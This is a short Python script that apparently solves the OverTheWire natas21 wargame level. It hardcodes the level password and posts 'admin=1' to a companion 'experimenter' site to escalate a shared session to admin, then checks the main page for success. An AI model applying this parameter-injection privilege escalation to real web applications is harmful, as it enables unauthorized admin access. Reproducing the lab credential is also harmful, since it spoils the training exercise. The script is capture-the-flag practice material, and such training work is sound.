import requests
#align=center&fontsize=100%&bgcolor=yellow&submit=Update
url1 = 'http://natas21.natas.labs.overthewire.org/'
url2 = 'http://natas21-experimenter.natas.labs.overthewire.org?admin=1'
username = 'natas21'
passw = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
data = {'align':'left','fontsize':'100%','bgcolor':'red','submit':'Update'}
session = requests.session()
r2 = session.post(url2,auth=(username,passw))

r1 = session.get(url1,auth=(username,passw))
#url2 = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug'
#r2 = session.get(url2,auth=(username,passw))
print r2.text
print "="*80
print r1.text

print "="*80
#print r2.text

if "regular user" not in r1.text :
	print "Hacked!!!!!!!!!!!!"
